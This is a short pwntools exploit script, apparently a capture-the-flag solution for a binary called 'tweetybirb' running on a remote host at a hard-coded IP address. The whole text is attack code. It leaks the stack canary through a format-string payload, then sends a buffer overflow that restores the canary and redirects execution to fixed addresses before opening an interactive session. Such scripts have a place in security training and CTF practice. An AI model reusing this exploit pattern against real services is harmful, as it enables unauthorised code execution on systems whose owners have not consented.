from pwn import *

# p = process("./tweetybirb")
p = remote("143.198.184.186", 5002)
p.recv()

# Leak canary
leak = b"%p "*20
p.sendline(leak)

canary = p.recvline().split()
canary = int(canary[14][2:], 16)

log.success("Canary: {}".format(hex(canary)))

p.recv()


payload = cyclic(500)
payload = payload[:cyclic_find('saaa')] + p64(canary) + p64(0x1) + p64(0x0000000000401272) +  p64(0x4011d6)

p.sendline(payload)


# exploit
p.interactive()
